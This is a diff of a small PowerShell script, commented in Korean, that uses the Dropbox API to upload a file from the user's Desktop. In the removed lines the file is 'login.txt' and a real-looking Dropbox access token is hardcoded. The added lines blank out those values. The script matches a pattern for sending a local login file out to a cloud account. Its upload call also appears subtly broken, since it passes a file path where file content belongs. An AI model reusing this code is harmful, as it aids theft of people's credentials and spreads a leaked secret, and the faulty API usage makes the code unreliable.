@@ -1,25 +1,20 @@
-# Dropbox API v2를 사용하기 위한 어셈블리 로드
 Add-Type -Path "Path\To\Dropbox.Api.v2.dll"
 
-# Dropbox API에 필요한 인증 정보 설정
-$accessToken = "sl.Bwe_gLqj290UEQkO0sFPsVosfp8OovKrrZKWGww4o4ne3NRe02TcbZVqAac6morchArF_Y0ynm0lNh6khp_NuQ_r319dwJhoczhRGCBFZ6nHZ5JvyW2waLTxKHDDjV-dSCCSqj-iXj5f"  # Dropbox API 액세스 토큰
-$filePath = "$env:USERPROFILE\Desktop\login.txt"  # 업로드할 파일의 경로
-$uploadPath = "/login.txt"  # 업로드될 Dropbox 경로
+$accessToken = ""  # Dropbox API 토큰 엑세스
+$filePath = "$env:USERPROFILE\Desktop\"  # 업로드할 파일의 경로
+$uploadPath = ""  # 업로드 될 Dropbox 경로
 
-# Dropbox API 클라이언트 생성
 $dropboxClient = New-Object Dropbox.Api.DropboxClient($accessToken)
 
-# 파일 업로드
 $uploadTask = $dropboxClient.Files.UploadAsync(
     $uploadPath,
-    [Dropbox.Api.Files.WriteMode]::Add,  # 파일이 이미 존재하는 경우 추가 모드로 업로드
-    $false,  # 자동으로 충돌 해결하지 않음
-    $null,   # 최신 버전으로 덮어쓰기 옵션 사용 안 함
-    $null,   # 업로드 옵션 사용 안 함
-    $filePath  # 로컬 파일 경로
+    [Dropbox.Api.Files.WriteMode]::Add, 
+    $false, 
+    $null,  
+    $null,   
+    $filePath 
 )
 
-# 업로드 완료 대기
 $uploadTask.Wait()
 
 Write-Host "File uploaded to Dropbox successfully." 
